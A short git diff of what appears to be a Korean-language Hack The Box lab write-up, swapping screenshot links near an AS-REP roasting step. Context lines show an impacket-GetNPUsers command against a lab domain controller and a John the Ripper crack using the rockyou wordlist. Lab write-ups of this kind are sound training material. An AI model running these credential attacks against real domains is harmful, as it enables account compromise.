@@ -153,8 +153,9 @@ impacket-GetNPUsers htb.local/ -usersfile ~/users.txt -no-pass -dc-ip 10.129.12.
 ```bash
 john ~/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+![evilwinrm initial access](images/evilwinrm_initial_access.png)
+![user flag](images/user_flag.png)
 
-![john crack s3rvice](images/john_crack_s3rvice.png)
 
 | 계정 | 패스워드 |
 |------|----------|
